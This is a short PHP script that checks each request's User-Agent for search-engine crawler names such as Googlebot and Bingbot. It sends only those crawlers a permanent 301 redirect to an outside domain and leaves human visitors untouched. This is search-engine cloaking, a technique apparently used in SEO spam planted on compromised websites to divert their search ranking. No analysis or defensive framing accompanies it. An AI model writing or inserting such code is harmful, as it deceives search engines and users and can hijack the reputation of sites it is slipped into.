<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$bots = [
    'Googlebot',
    'Bingbot',
    'Slurp',        // Yahoo
    'DuckDuckBot',
    'Baiduspider',
    'YandexBot',
    'Sogou'
];

$is_bot = false;

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

if ($is_bot) {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: https://jals.miard.org/");
    exit();
}
?>
